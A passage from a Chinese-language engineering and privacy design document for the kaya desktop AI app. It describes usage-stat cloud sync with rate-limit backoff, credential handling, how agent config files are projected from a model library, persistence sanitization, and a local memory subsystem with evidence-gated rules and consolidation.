事件下界)领先云端时间**时(关闭上传 / 换账号会把游标推到下一个用量桶,水位取 `max(既有游标, 下一桶边界)` —— **单调不减**,本机时钟被调早也不回退;2026-10-28 起重新授权改走「隔离重定基」,不再把游标推到下一桶),聚合窗口为空 ⇒ 本轮**跳过**:零聚合、零设备注册、零摄入、零游标写入(游标在同步轮内**单调不减**,不得被拉回云端时间 —— 拉回会把关闭期间的事件补传)。这段**等待期不算「同步成功」**:不刷新「上次成功同步」时刻、不清掉既有错误码;但仍计入 5 分钟兜底间隔(否则等待期会退化成每 60 秒一次的 coverage 轮询)。**等待期内事件驱动路径同样受这条 5 分钟间隔节流**(事件路径本来为「近实时」放开,但等待期每轮必然是「跳过」,放任它会把等待变成「每来一个用量事件就拉一次 coverage」的高频轮询);等待期里的待办用量事件**不丢失**,间隔到期后自动补一轮。**限流(429)的中途恢复**:回填采用部署级独立限流(建议 10 请求/分钟/用户),批量回填可能遇到 429;撞 429 时客户端按服务端实际返回的 `Retry-After` 等待后**重发当前批**(前面成功的批**不重发**、游标**不提前推进**,全部批次成功后才推进;桶值是累计值 ⇒ 重发是幂等覆盖,不会重复计数),直到该批成功或出现非 429 错误 —— 避免「整轮从第 1 批重来」在限流下永远传不完。**这段等待可被打断**:用户点「关闭上传」时,在途同步在请求边界与等待期间立刻停下(取消**不是错误、也不是成功同步**:不刷新「上次成功同步」、不清错误码、**不推进游标**,待办用量事件保留),关闭立即生效 —— 用户不必等满服务端给的 `Retry-After`。整轮级别的 429 按服务端 `Retry-After` 退避(单次等待钳到 **1 小时上限**;单批连续 429 等待达到 **60 次**后,上抛可重试 429 交给整轮退避阶梯 —— 避免服务端给出超长 `Retry-After` 时一轮同步被无限挂住、一直占着跨进程锁与「同步中」状态;游标未推进 ⇒ 下一轮重发整轮累计桶,幂等安全),5xx 与网络失败按 1m→2m→4m→8m→16m 退避。取登录令牌失败时按类别分流:网络 / 超时进同一张退避阶梯(网络恢复后自动重试),登录态失效等下次登录态变化再试,其它本地永久错误才停止自动重试。
- **界面口径**:设置页展示开关、同意 / 撤销状态、**上传范围说明**(目的 + 自动同步说明)、**JWT 只用于请求鉴权的独立安全说明**、首次回填进度、上次**成功**同步时刻(`last_sync_at` 随本机状态持久化,重启后仍可读;账号切换 / 撤销重同意清空,同账号重开保留)—— 时间值是 UTC RFC3339,**展示层换算成本机时区的可读本地时间**(无法解析的值**保留原文**,不显示 `Invalid Date`;`null` 显示「尚未同步」)与上次失败(`last_error` 仅进程内);另展示最近结果 `last_result`(`synced` / `no_new_data` / `waiting_next_bucket` / `already_syncing` / `skipped` / `error`)、成功更新桶数、`skipped` 的固定原因码 `last_result_reason`(界面按原因区分「取消前可能已发出部分批次」与「零发送」)与等待游标(同样是本机时区的可读时间;**上传桶 / 游标 / wire 仍是 UTC RFC3339**,只改展示层),手动「立即同步」因此能区分成功、无新数据、等待、已在同步与失败。**失败以友好文案展示**(固定错误码映射为双语说明),**原始固定码只留在 `data-error-code` 属性里供诊断**,界面**不显示原始错误串**;同步在途时另显示一枚**独立**的「同步中…」徽标 —— 它**不替换**表示开 / 关的主状态徽标(用户始终看得到上传开没开),自动同步完成后「立即同步」仍作为手动兜底可用;**「正在回填」只在真的已开启(同意有效)且首次回填尚未跑完时显示** —— 未开启 / 同意已过期时不显示回填进度。前端**不接触任何原始桶**,上传内容全部在 Rust 侧本地聚合后发出。
- **用量事件部署归属**：新桌面 Chat/网关事件记录 `cn` 或 `intl`（由 bundle identifier 确定），云聚合仅接收当前部署；独立 CLI 无云部署选择，新事件记 `local`，仍保留本机统计，但不进入 CN/Intl 云同步。未知标记不上传。旧无标记事件无法核验归属，为兼容仍可由两个部署上传；这些事件不会因升级被追认身份。回填最多 30 天且受本机实际记录、保留期与授权窗口限制；未记录或已滚动删除的历史无法回填。
- **云端备份残留 ≤30 天**由 Users 侧保证(见 `docs/api/usage-stats.md` §4.9)。**云端接口属 yunhou-users 仓,客户控制台看板属 yunhou-website 仓**;用户可见的云端数据条款由相应网站的隐私政策约束。

**聊天临时图片的已知边界(2026-10-03)**:boot 清扫以进程为单位、以
`~/.kaya/tmp-images` 根为对象 —— dev app(`com.kaya.dev`)与 prod 并行
运行时,一方 boot 会清掉另一方仍在期的整个 tmp-images 根目录,另一方
已发消息上的「发送给 agent」路径随之悬空(按钮点击后 agent 读不到
文件)。接受为设计边界:tmp-images 本就不承诺跨进程存活,dev/prod
并行只是让这个窗口从「重启」提前到「对方启动」;图片本身仍只活当次
会话,无额外泄露面。

**App 版本元信息**(round-56, 2026-06-28):`get_app_info` Tauri 单例
命令从 `tauri::Builder` + `env!` 宏读 version / product_name /
git_commit / build_time / target triple / identifier,Settings → 「关于」
tab 和 Chat 空状态显示。**不写 localStorage、不写 audit JSONL、不写
磁盘** —— 纯内存,重启重读。详见
`docs/superpowers/specs/2026-06-28-app-version-display-design.md`。

**API Key** 只发到 LLM 鉴权 header,进 conversation JSON / audit JSONL
时会作为 scrub 类别处理。审计日志只记"用了哪个 provider",不记 key
内容。

**OAuth token 的口径(2026-10-17,Phase 3)**:与 API Key 同级——只进 LLM
鉴权 header(`Authorization: Bearer`),由 Rust `resolve_bearer` 在发送期
解析(临期先 refresh、401 强制刷新重试一次),**前端结构性拿不到 token**
(`provider_oauth_*` 的 wire DTO 只有状态 / user_code / 验证 URL / 固定
哨兵);IPC 白名单显式拒收 `llm_oauth_*`(通用 `secret_get/set/delete`
读不到、写不进该域)。登录态是**易失**的:flow entry 与 expired 标记只在
Rust 进程内存,重启后按 keychain token 存在性重新派生;前端的 OAuth
状态缓存(`oauthStates`)不写 zustand persist。**「退出登录」只清本地
keychain token + 内存态,库文件与 `auth_kind` 不动,也不通知任何服务端**
(服务端 token 按自身过期策略失效)。

**agent 配置文件是模型库条目的投影(2026-09-10)**

Agents 面板「使用」写入的四个 agent 配置文件(`~/.claude/settings.json`、
`~/.kimi-code/config.toml`、`~/.config/opencode/opencode.json`、
`$CODEX_HOME/kaya.config.toml`)不再是**一次性快照**,而是模型库当前条目的投影 ——
库的增 / 改 / 删(`model_library_upsert` / `model_library_delete`)会把差异收敛进
去(`src-tauri/src/agent_model_sync.rs`)。

- **投影也包含思考档位键(2026-10-24)**:模型库的思考能力 / 档位会投影成各家
  原生配置 —— kimi `models.<alias>.support_efforts` / `default_effort`、codex
  profile 的 `model_reasoning_effort`、opencode 条目的 `options.reasoningEffort`、
  claude `env` 的 `ANTHROPIC_DEFAULT_{OPUS,SONNET,HAIKU}_MODEL_SUPPORTED_CAPABILITIES`
  与 `CLAUDE_CODE_EFFORT_LEVEL`。这些键只表达「能力与档位」,**不含任何凭据与
  端点**;思考能力 / 档位等模型元数据也会按现有脱敏管道用于配置优化分析
  (`agent_config_analyze` 的 `model_metadata`)。没有声明时摘键,不写空值。
- **删条目 = 把明文 key 从 agent 配置文件里移除(隐私正向)**:此前删掉库条目后,
  agent 配置文件里的 base_url / model / **明文 API key** 原样留着,而 UI 因为列表里
  已无匹配条目反而显示「没在用」——密钥以明文形态躺在别处、界面说没这回事。现在
  删除会把 kaya 托管的那部分从 agent 配置里移除(含 kaya 写入的凭据字段);库条目
  的 key 被清空时,同样把配置文件里遗留的明文 key 一并清掉(apply 契约新增
  `clear_api_key` —— 旧契约里「空 api_key」只表示「保留现有 key」,清不掉)。
  **收敛范围限于当前处于绑定关系的 agent**:绑定记录是 v2.2.1 才有的,条目若在
  **升级前**(v2.2.0 及更早)就被删除,那份配置里既没有绑定、也没有条目与之对应,
  kaya 无从判定「这是自己写的、该收回去」——这种存量残迹**不会被自动清理**
  (没有绑定就自动 un-apply 会误删用户自己的配置)。它只被记一条 warn 级
  app_log(事件 `agent_binding_stale`,payload 只有 `agent_id`,不含端点值 / key);
  用户对该 agent 重新点一次「使用」即可收敛,想回到 kaya 接管前的值只能手动
  恢复 `.bak`。
- **写入 claude 配置时会摘掉冲突的 `ANTHROPIC_API_KEY`(写入点行为,2026-09-10
  复审 n4)**:claude-code 的凭据字段是 `ANTHROPIC_AUTH_TOKEN`(第三方中转的事实
  标准),而 Claude Code 把同时存在的 `ANTHROPIC_API_KEY` 与它判成冲突 —— 所以
  **apply 的写入分支**在写入 `ANTHROPIC_AUTH_TOKEN` 时会顺手移除
  `ANTHROPIC_API_KEY`(第三方中转工具的通行做法)。这是「写入新凭据时去冲突」,不是
  「kaya 的 key 归 kaya 管」:`clear_api_key` 分支与 un-apply **都只摘 kaya 自己
  写过的 `ANTHROPIC_AUTH_TOKEN`,一概不碰 `ANTHROPIC_API_KEY`** —— 那个键可能是
  一把 kaya 从未写过的用户密钥,删它等于替用户毁钥。
- **绑定记录不含密钥**:「谁在用哪条」记在库文件顶层 `bindings`
  (2026-10-16 供应商分层起值为对象:
  `{"kimi-code": {"provider_id": "p_ab12cd34", "model_id": "kimi-k2-0905-preview", "via_gateway": true}}`),
  只存 agent id → (provider id, 模型 id) 的映射;API key 始终只在
  keychain(`llm_api_key_<provider id>`),绑定不引入任何新的密钥落盘面。形状降级是**逐条**
  的:整个键不是对象时按空处理,对象里只有非法的那一对被丢弃、合法绑定照常保留
  (不整表清空 —— 否则下一次落盘会把用户其余有效绑定一起写掉);一条都不剩时**删掉
  该键**,不在用户文件里留 `{}` 空壳。降级事实写 app_log,不让库读失败。
- **同步只动 kaya 托管的部分**:un-apply 精确到 kaya 自己写过的键(claude-code 的
  托管 env 键与带 `configured by kaya` 标记的 picker 行;kimi-code 的
  `providers."kaya-switch"` / `models."kaya-switch/main"` / 仅当等于 kaya 别名时的
  `default_model`;opencode 的 `provider.kaya` / 仅当 `kaya/` 前缀的顶层 `model`;
  codex 的 profile 与生成的 catalog 两个 kaya 文件,外加 2026-09-09 之前版本直接写在
  Codex 官方配置里的痕迹 —— kaya 的 provider 指针 / 顶层模型名 / catalog 指针 /
  带**明文 bearer** 的 `[model_providers."kaya"]` 块),**用户自己的字段 / 其它
  provider / 其它 picker 行一律保留**;**同步(apply / un-apply)只作用于有绑定的
  agent** —— 无绑定的 agent 不会被写入、不会被 un-apply。身份登记与陈旧残迹检测
  (见下)会对**无绑定**的受支持 agent 的配置文件做一次**只读**检查(读 kaya 标记与
  当前端点值):不写内容、不改配置 —— 与所有读取路径一样,它可能顺带把过宽的旧文件
  权限收紧到 0o600(`read_json_object` / `read_toml_table` 的既有行为)。值全同则
  一个字都不写盘(不刷 `.bak` 噪音)。绑定指向的条目已不在库里
  时(崩溃 / 掉电残渣)读路径会补一次 un-apply 并清掉绑定 —— 否则界面显示「没在用」
  而 agent 仍在用已删条目的端点与明文 key。
- **历史行为(配置快照机制引入前)**:旧版 apply 覆写的用户值未必有可恢复来源,当时 un-apply 只摘 kaya 托管部分,需要用户自行还原 `.bak`。**当前行为以 §8.2 为准**:接管前逐键快照,撤除按所有权和当前值恢复,保留用户后续改动;未知原值不伪造,未恢复原值可能另存 `.unrestored.<uuid>.bak`。
- **启动 / 打开面板不做例行重写**:`model_library_list` 做迁移 + 身份登记 + 悬空绑定
  清理,`agents_model_config_get` 读前只做单 agent 登记,两者都不做库的增 / 改 / 删;
  编排里的收敛对三个命令都跑,但**值全同就一个字都不写盘** —— 只有「绑定仍在而 agent
  配置文件已被外部改过」(漂移,收敛回去)与「绑定指向的条目已不在库里」(悬空绑定,
  见上)这两种确需纠正的状态才会写 agent 配置。身份登记(adoption)的判定:升级用户此前用「使用」配过但没有绑定记录,配置文件当前
  (base_url, model) 恰好唯一匹配一条可解析条目时才补上绑定,0 条(用户自己配的)或
  ≥2 条(歧义)都不登记;认错比不认更糟(绑定错了会让下一次库变更覆写用户自己的配置)。
  登记还要求配置文件里存在 **kaya 自己写过的标记**(claude 的 `configured by kaya`
  picker 行 / kimi 的 `providers."kaya-switch"` / opencode 的 `provider.kaya` /
  codex 的 profile 或旧布局 base config 的 `model_provider = "kaya"`)—— **用户手写
  的配置不会被认领**,即使端点与库里某条逐字相同,也就不会在删除条目时被连带清掉
  (那会连他自己的 base_url / model / 明文凭据一起删光);标记读不出来按失败处理,
  不当「没有标记」放行。**改过端点导致与库里任何条目都对不上、或对应条目已被
  删除时,这个 agent 不会被登记** —— 面板不显示「使用中」(漂移提示同样不会出现:
  `isDrifted` 以「绑定存在」为前提,而没有绑定就没有可比的条目),也不会被后续
  收敛覆写;对该 agent 重新点一次「使用」即可重新建立绑定。
- **可排查**:同步动作记 app_log(tag `models`,事件 `agent_model_sync`;payload 含
  agent_id / provider_id / action,**不含密钥**);登记 / 收敛失败只记日志、不阻断模型库
  命令(与「迁移失败不阻断」同策略),且**逐 agent best-effort** —— 单个 agent 读 / 写
  失败不影响其余(失败的绑定保留,下次操作重试)。明文 key 的比对值
  (`current_api_key`)只在同步内部使用,**不跨 IPC 边界**;`ModelConfigStatus` 里与
  key 有关的只有两个布尔 —— `has_api_key`(agent 配置文件里有没有 key)与
  `entry_key_present`(**绑定的那条条目在 keychain 里有没有 key**;无绑定 / 不支持 /
  keychain 读失败为 `null`,不参与面板的不一致判定),**只有存在性,没有 key 值**。
  另有 `agent_binding_stale`(warn 级,见上「删条目」一条:配置里有 kaya 标记、
  库中却已无对应条目的存量残迹,payload 同样只有 `agent_id`)——它只报不改,
  自动清理会误删用户自己的配置。

**持久化前 sanitize**(`src/lib/messagesPersist.ts`):
- `reasoning` 字段**不存**到 localStorage — 前端展示层的思考链只在
  audit JSONL 里,刷新页面就丢(防止 localStorage 5MB 撑爆 + reasoning
  太长无意义缓存)。注意区分 Rust 侧会话存储(2026-09-16 起):
  `~/.kaya/conversations/*.json` 里 assistant 消息的 `reasoning` **始终
  落盘,与 thinking 显示开关无关** —— 上游模型(DeepSeek v4 默认思考、
  Kimi k2.6+/MiniMax M2+ 常开)即使在 thinking=OFF 时也会产出
  reasoning_content 并要求下一轮原样回传,丢弃会在多轮工具调用后触发
  400「reasoning_content must be passed back」;显示闸在 agent loop 的
  事件发射层(thinking=OFF 时前端仍不渲染思考块),落盘只为满足回传
  契约。数据不出本机,仍受同一套落盘权限与 scrub 约束。
- `toolCalls.outputFull` 不存(ephemeral "展开" copy,丢了可重跑命令)
- `retryText` 不存(v2.3.3 review R2):错误 banner「重试」按钮钉在消息上
  的原文快照是**未 scrub 的用户输入**,而 reload 后按钮本就不渲染
  (retry 动作依赖的 `lastSentText` 是运行时字段,刷新即 null)——
  持久化它纯属把明文原文写进 localStorage,无功能收益。strip 只发生在
  持久化边界,内存态当前会话内的重试行为不受影响。
- `toolCalls.output > 30KB` 截到 30KB 标 `outputTruncated: true`

`Message.kind` 字段保留(banner message 跨 reload 不丢,用户看到
"工具调用次数耗尽"提示不消失)。

**定时任务 prompt 的留存与聊天消息不同**(v2.1.12,R2-G6):聊天
消息走 scrub-first —— 用户输入 guard 在进 store / audit 之前就脱敏,
落盘的是脱敏后文本;定时任务的 prompt 是用户在 Settings 表单里自己
写的配置,以**原文**留存本机 localStorage(不 scrub、不出本机边界),
脱敏在每次 fire 的出门前跑(runAgent 入口的同一道用户输入 guard,
scrub → truncate → 才进 llm_chat)。即:留存原文 ≠ 外发原文,外发
路径与手敲聊天消息完全同构。**传输面补充(2026-09-03 review;
2026-09-19 补 queue_snapshot)**:
`schedule_manage` 的 list 输出(任务快照,含每条 prompt 的 40 字
预览)、`task_list` 的任务清单快照与 `task_queue` 的队列快照
(`queue_snapshot`,含每条任务的 title / brief / 状态)同款 ——
内容是用户自己的数据,不经 scrubber、原文直达 LLM provider
(scrub 是各工具自管的,这三个工具按先例不调)。

**目录级纵深与其余 v3.0.7 落盘/入口加固(2026-10-08)**:
`kaya-core::data_root` 是统一的目录权限入口 —— `~/.kaya/` 根与已知子
目录创建时 0o700,boot 时对已存在的过宽目录收紧(只碰目录不碰文件、
不预建缺失子目录,best-effort);Unix-only,Windows 下无 per-app 文件
隔离(依赖 NTFS 默认 ACL 与凭据管理器,属平台固有限制,此前文档宣称
的 0o600 口径是 macOS 语义,特此如实说明)。同批:① CLI REPL 的
history 落盘与输入 guard 改为委托全量 `apply_user_input_guard`(Strict
档 —— 此前只覆盖 PEM + `sk-` 两类,GitHub PAT 等会原文落 history
文件);CLI 输入 guard 档位与桌面对齐恒 Strict(输出 scrub 档仍尊重
CLI 配置);② `control_grant_respond` 加 pending 状态机门 —— 无对应
pending 授权请求的批准直接拒,已授权同 (tab, agent, pid) 指纹幂等
放行,deny 不受门约束(IM / 远程的卡片批准走独立路径、自带指纹 TTL
校验,不受影响;重启后复活的遗留授权卡点击会得到错误提示而非静默
授权);③ 内置 `/chat` 与 BYOK 的上游错误 detail 统一经
`sanitize_upstream_message`(JWT 剥离 → Strict scrub → 截断)后才
上屏 / 上 IM —— BYOK 的 ProviderError 臂此前连 JWT 剥离都没有,
恶意上游无法在 4xx/5xx body 里塞回显内容落到会话与 IM。

### 8.1 记忆子系统(Memory,2026-09-04)

源码:`crates/kaya-core/src/memory/`(types / store / versions / review /
autonomy / retrieve / decay / consolidate / prompt),桌面命令壳
`src-tauri/src/memory_tauri.rs`,前端 `src/lib/memory.ts` +
`src/components/SettingsMemory.tsx`。

**存储与落盘纪律。** 全部记忆数据在 `~/.kaya/memory/` 下,无云同步、
无遥测,与 kaya 其它本机数据同一边界:

- `core.json` — 核心记忆(Pinned 条目的投影,整写)。
- `episodic/YYYY-MM.jsonl` — 情景记忆按月分片,只追加。
- `review.jsonl` — **存量候选队列(已退役,2026-10-28)**:新生产路径
  不再写入(自动裁决没有「等待批准」这一态);该文件只剩一个用途 ——
  存量条目的自动迁移,成功项出队,留下的只是尚未迁成的技术重试项。
- `review-history.jsonl` — **最近自动变更台账**(2026-10-03 建立时是
  「已处理审查记录」,2026-10-28 改义):每次自动结局(新增 / 强化 /
  取代 / 归纳 / 归档,reason `auto_*`,存量迁移为 `legacy_auto_*`)
  成功后追加一条(内容 + 动作 + 时间),上限 200 条、超出 FIFO 淘汰
  最旧,供 设置 → 记忆 的「最近自动变更」只读回看;不进任何 LLM 工具
  输出。
- `versions/<memory_id>.jsonl` — 每条记忆的版本链,只追加、永不改写
  (唯一例外:「彻底删除」purge 会把全部历史版本的 content 抹为
  `[purged]`,版本骨架保留,见下「删除即遗忘」)。
- `staging/` — 巩固管线的中间产物(被淘汰会话的待消费快照)。
- `state.json` — 全局状态(巩固游标 / 上次衰减清扫时间)。旧字段
  `auto_accept` / `auto_accept_threshold` 仍在文件里(**只为 wire 与
  文件格式兼容,已不影响任何写入** —— 自动裁决不看它)。

写入一律同目录 `.tmp` → fsync → rename(原子),Unix 新建文件
0o600(与 conversation / audit 落盘纪律一致);JSONL 读取容错
(坏行跳过 + warn)。核心记忆有容量闸:24 条 / 2KB 上限,超限写入
在落盘前被拦(`core_full`),零副作用。

**分层与生命周期。** 记忆分四层(2026-10-03 engram 分层补全):
核心(Pinned,每回合注入上下文,见下)、语义(Semantic,从同类
情景归纳出的一般性知识,见下「语义记忆层」)、情景(Normal,按需
检索)、归档冷存(Archived,默认不进检索)。显著度(salience)驱动
衰减:boot 与 `memory_stats` 读取前做周期清扫(≥24h 一次),Normal
条目 30 天未被命中 salience −0.1,低于 0.2 自动归档(Archived);
`memory_search` 每次命中 +0.1,Archived 条目被命中会复活
(salience 回到 ≥0.2;`memory_timeline` 的 archived 命中是刻意只读
——不回写、不复活)。Pinned 与 Semantic 不参与衰减(常识/规律
不遗忘)。**原始会话与审计的保留策略不变**(会话 50 个 LRU 上限、
审计 90 天修剪);被淘汰的会话在删盘前把完整快照放进 `staging/`,
等下一轮巩固消费后才删快照。记忆条目本身永久保留;「丢弃」不是
物理抹除,而是落 tombstone(逻辑删除:检索、列表、注入全部不可见)
并留版本链痕迹,保证全程可审计。**自动生命周期不做物理删除
(2026-10-28)**:自动裁决只会新增、强化、归纳、归档,以及回填可撤销
的 `superseded_by`;内容抹除只发生在你显式操作时(设置 → 记忆 的
「丢弃」/「彻底删除」,或你自己删文件 / 删目录)。

**规则 / 事实分类(2026-10-11,spec
`docs/superpowers/specs/2026-10-11-memory-kind-scope-index-design.md`)。**
每条记忆带 `kind`(rule / fact,旧数据默认 fact)与 `scope`
(global / project;2026-10-12 P1 起生效 —— 「记住:本项目:…」/
"project: …" 内嵌标记或巩固抽取建议的 project scope 绑定写入时的
cwd,归一化后落库;桌面 cwd = 前端透传的活动 pane cwd(缺省/空白
回退 run_shell 工作目录),CLI = 启动目录,
IM = provision 绑定目录,cwd 未知一律降级 global,fail-closed 不
报错)。规则是「每回合必须在场」的行为约束(如「提交前先跑
测试」):它不进检索池(memory_search / memory_timeline 一律
排除)、不参与衰减、不进 core.json,而是渲染进上下文消息独立的
`[规则]` 段(容量闸:全局 ≤16 条 / 单项目 ≤8 条 / 渲染段 ≤1KB,
超限 `rules_full` 零副作用;项目规则仅当会话 cwd 命中其绑定路径的
前缀时注入,行首标「(本项目)」,与全局规则同过 Strict scrub ——
注入的只有规则**文本**,scope 路径本身不进上下文)。**规则按确定性证据
自动生效(2026-10-28 自主记忆;2026-10-29 发布复审收紧)**:只有 `ExplicitUser`
候选才可能自动成为 Pinned 规则、下一回合注入。来源消息 id 命中本批真实用户
消息只是归因前提,不是充分证据:被引用的用户消息必须独立通过
`detect_remember_intent` 的**规则**分类,且检测器剥离后的待记正文与候选正文
规范化(空白折叠 + 小写)后**精确一致**;模型自报 evidence、真实 id + 无关或
改写正文、`RepeatedPattern` / `UserAsserted` 规则候选全部降为事实评估、不获
恒在场权限,`AssistantInferred` 永不成为规则。legacy 存量迁移保留原例外,不
扩大在线权限。`memory_add` 的 kind 由注册时用户原文确定性分类,模型自报
kind 不一致即拒(省略 kind 时沿用意图分类);strict 兜底只写剥离后的待记
正文,inline 仅在明确的「标点 + 连接词 + 任务动词」边界截断,普通连接词
不误裁,不再把「记住:规则:」前缀或后续任务原文直接固化。`salience`
只表达长期价值与检索权重,**不是用户证据** —— 再高的显著度也不给规则
权限。规则容量满时新规则落 Archived(不排队、不静默挤掉已有规则);
合法的自动 Supersede 会释放目标容量,但容量闸始终是**纯读预检**、在任何
落盘之前,不声称「同一事务」的原子性(失败与重放语义见下)。去重命中
(强化 / 复活)与显式「记住」命中去重时**升级 stored evidence**:
`ExplicitUser` 最强,`RepeatedPattern` / `UserAsserted` 可升级
`AssistantInferred`,弱证据**不得覆盖**强证据;`SemanticCluster` 是归纳
条目自身的构造证据,在语义归并里保持不变。归档的 `AssistantInferred`
条目被用户证据重申复活后,evidence 跟随升级。事实维持既有语义:Pinned 进
`[核心事实]` 段、Normal/Semantic 进按需检索;检索排序带 scope 加权
(项目条目命中当前 cwd ×1.3、不命中 ×0.7 软降权,不硬排除)。此外
上下文消息新增`[记忆索引]` 段:全部可见事实的一行摘要(id + ≤60
字符,Strict scrub 后截断,≤1KB),让模型「知道自己有什么记忆可
查」再按需调取;`memory_search` 输出带「共命中 N 条,以上即全部
命中」边界标注,零命中返回「无相关记忆命中」纯文本(拒答信号,
防编造)。**冲突与知识更新(2026-10-12 P2;2026-10-28 自动裁决)**:
巩固去重在 jaccard ∈ [0.5, 0.8) 的第二档把候选标
`conflict_candidate_of`。**合法自动 Supersede 必须同时满足**:目标
真实存在、目标不是自身、kind 与归一化 scope 相同、目标仍活跃、候选有
`ExplicitUser` 或 `UserAsserted` 用户证据、目标属于本次相似 / 冲突候选
集合、候选 `event_at` 不早于目标;成立时新条目入库、旧条目回填
`superseded_by`(失效而非删除,本体与版本链永留)。旧条目指针与核心投影
摘除是**必要一致性副作用**、不是 best-effort:任一步没落定即返回可重试
错误,重放识别已入库的等价新条目并补齐,不再新增。**任一条件不成立
就不得覆盖旧条目**:若目标确属冲突候选,新条目带
`conflict_with=<旧条目 id>`,**双方都保留**(旧条目自身不被改写),
检索摘要透出该指针让 Agent 在上下文中判断;仅凭 jaccard 冲突带
**绝不**自动 Replace。被 supersede 的条目检索与规则注入一律排除、
不占规则容量。Settings → 记忆 的事实条目仍可手动「标记取代…」
(`memory_update` 的 `supersede_old_id`,目标不存在 fail-closed 零
副作用)。规则 ⇄ 事实互转与作用域变更走
`memory_update`(Settings → 记忆规则区,版本链 actor=User)。

**必要副作用、失败与重放(2026-10-28)。** 一次裁决**不**承诺是单个原子
事务(多文件落盘无法不带补偿地原子提交),分两类:
- **必要一致性副作用** —— 条目本体、条目指针(`superseded_by`)、成员失效
  指针、核心投影(`core.json`)与**当前版本记录**。任一失败 ⇒ 返回**可重试
  错误**:批游标不推进、legacy 队列项保留;本轮能成功的部分照做,内存快照
  同步到盘上真实状态。错误只带固定短码 / 计数,不含任何条目原文。
- **best-effort** —— `review-history.jsonl` 的活动记录(写失败只 warn,不
  推翻已成立的结局)。
重放**补偿**而不是重复新增:归纳重放归并到已入库的等价语义条目(补成员
指针 + 活动),已指向它的成员仍参与核心投影补偿;补偿目标必须**仍活跃**:已被取代的语义条目不得再认领成员。用户编辑、rollback、purge 与 relink 统一推进成员所有权代际,先落成员权威态,再清旧 Semantic 登记;登记失败返回可重试短码,不撤销已经落盘的用户决定。
归纳另有**无 LLM 补偿通道**(不调模型、不记活动、不强化),只有持久精确声明与成员当前 pointer/epoch 匹配时才补指针;成员已经指向目标时仅对账投影。历史无声明的 id 集不授权重挂,只按当前指针对账。A→B→purge B 后旧 A 不得重新认领;同指针 rollback 也使旧声明失权。
取代重放
只认**持久操作身份**(新条目的 `supersedes` 指向被取代的旧条目 id;只有自动
取代会写它,其它路径不落盘):内容等价但没有该身份的条目(用户手写同义事实、
语义汇总、别的操作的产物)一律不得顶替;证据与时间校验在重放识别之前执行,
`RepeatedPattern`、更旧的 `event_at`、kind/scope 不符都不得借重放绕过。重放
只补旧条目指针、核心投影与新条目的当前版本记录 —— 不新增条目、不重复活动、
不重复强化。取代的活动记录只在必要副作用全部成功之后写,失败的尝试与重放补偿
都不记(同一结局最多一条);**归纳 / 归并的写序不同** —— 它在补偿尝试之后、
错误汇总之前写活动(巩固管线「同簇已处理」闸的数据源),而恢复**不依赖**活动
历史(靠语义条目自带的精确声明);巩固处理某会话失败后,继续下一个会话前会重读盘上
情景快照,避免半落盘条目在陈旧视图里被重复写入。当前版本记录缺失由后续去重 / 复活 / 重放路径补写
(`ensure-current-version`);版本链只追加,绝不回滚条目伪装原子。归档是
幂等终态(等价归档条目直接返回),legacy `review.jsonl` 用**严格读取** ——
坏行或读取中断让整轮迁移在任何候选写入前中止,文件字节不变、零记忆写入。

**巩固的 LLM 外发边界。** 巩固(consolidate)是把会话内容交给 LLM
「提炼」为候选记忆的唯一路径,外发范围严格等于你当前选择的聊天
provider:

- **BYOK**:用 Settings 里当前配置的 provider / model / key,与聊天
  回合同一通道。
- **内置模型**:走 yunhou `/chat` 代理(JWT),且过与 `llm_chat`
  同款的登录门 + 付费门;无付费权限时不报错、不抽取,返回
  `skipped_paid_gate` 空报告(前端 toast 引导订阅)。
- **Ollama**:本地推理,巩固同样零外发。

触发点:新会话收尾自动巩固(空会话跳过,不消耗配额)、启动时周期
巩固(2026-10-02:auth 落定后判定——开关开、已登录、有待处理增量
且距上次 ≥24h 才跑,可在 设置 → 记忆 关闭)、Settings →
记忆「立即巩固」手动触发、`staging/` 快照在下一轮巩固时消费。抽取
prompt 要求模型只输出 JSON 数组;抽取失败只记 warn,不阻断会话。
2026-10-03 起抽取 prompt 另带三条排除规则(中英双侧):不抽瞬时状态
快照(tab 映射 / 进度汇报 / 未提交未部署等易过期状态)、不抽 kaya
自身机制与策略边界的描述、不抽 QA 测试残留,并要求「宁缺毋滥」——
对真实队列的复盘显示约半数候选是这类低价值噪音,在抽取侧拦截比
事后清理省时省配额。

**自动裁决与工具可见性(2026-10-28 起)。** 记忆写入有两条路径,口径不同、
都没有「等待用户批准」这一态:① **自动裁决路径**(巩固抽取 / 语义归纳 /
legacy 存量迁移)统一经 `memory/autonomy.rs::commit_candidate`,终态只有
六种:写入(`Accepted`)/ 强化(`Reinforced`)/ 取代(`Superseded`)/ 归纳
(`Generalized`)/ 归档(`Archived`)/ 拒收(`Rejected`,只带固定原因短码);
② **显式「记住」路径**(pure / inline / loose / 待记正文兜底)走 `capture` 的
typed 直写(`capture_with_kind`,`capture_direct` 是其 Fact 兼容 wrapper,
待记正文兜底为 `capture_fallback`),各自给出准确结局:写入
(Normal / Pinned)、去重命中只做强化合并、规则满容落 Archived(如实提示
「已归档,未生效」)、内容为空或整条只剩 secret 占位时拒写。两条路径都**不再
受 `auto_accept` 开关与阈值影响**。三个 memory 工具(`memory_search` / `memory_timeline` /
`memory_get`)只读已入库的 episodic 与 core(tombstone 不可见,
`memory_get` 按 not_found 处理),核心注入块只渲染 Pinned 条目;已退役的
队列文件也不再被任何工具读取。`memory_search` 的摘要新增 `evidence` 与
`conflict_with` 两个字段(后者无冲突时为 null,形状稳定),让 Agent 能
区分用户事实、助手推断与未决冲突。精确边界:`~/.kaya/memory/` 目录
本身处于 trusted root 之内,`cat` 类 trusted-read 命令可以读到其中的
文件(与 conversations/ 等本机数据的先例一致),scrubber 照常运行。

成员所有权使用独立于内容版本的 `ownership_epoch` 与持久精确 `semantic_claims`。成员先落盘再清旧登记;失败按当前权威态补偿。历史成员 id 集不构成重挂许可。失权声明保留为无正文撤销事实,同一目标自动归纳不能撤销用户解挂;明确用户 relink/Replace 仍可改指。purge 清声明和全部版本正文,保留无正文队列操作身份以拒绝旧操作重放。此契约依赖进程内 `store::io_lock`,不宣称跨进程事务。

**队列容量:已退役(2026-10-28)。** 审查队列的 200 条容量闸、FIFO
淘汰成 Archived、入队前 jaccard 去重都**不再是生产路径** —— 自动裁决
不产生待审候选(低置信候选的归宿是归档或拒收,不是重新排队)。存量
`review.jsonl` 的条目由 `memory_stats` 在既有记忆锁内、统计前做一次
**幂等自动迁移**:旧候选缺省 `UserAsserted + Add`(legacy 上下文不要求
